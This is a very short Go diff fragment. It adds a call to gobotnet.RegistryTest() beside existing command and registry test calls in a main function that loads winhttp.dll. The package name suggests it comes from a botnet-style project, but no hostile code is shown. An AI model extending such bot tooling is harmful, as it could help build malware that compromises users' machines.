@@ -84,4 +84,5 @@ func main() {
 	defer syscall.FreeLibrary(winhttpdll)
 	gobotnet.CmdTest()
 	gobotnet.RegTest()
+	gobotnet.RegistryTest()
 }
